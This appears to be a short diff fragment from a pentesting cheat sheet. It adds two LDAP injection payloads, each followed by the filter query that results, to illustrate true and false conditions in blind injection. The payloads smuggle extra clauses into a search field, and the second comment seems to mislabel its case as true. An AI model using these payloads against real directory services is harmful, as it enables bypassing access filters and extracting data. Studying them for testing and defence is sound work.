@@ -1,0 +1,8 @@
+#This will result on True, so some information will be shown
+Payload: *)(objectClass=*))(&objectClass=void
+Final query: (&(objectClass= *)(objectClass=*))(&objectClass=void )(type=Pepi*))
+
+
+#This will result on True, so no information will be returned or shown
+Payload: void)(objectClass=void))(&objectClass=void
+Final query: (&(objectClass= void)(objectClass=void))(&objectClass=void )(type=Pepi*))
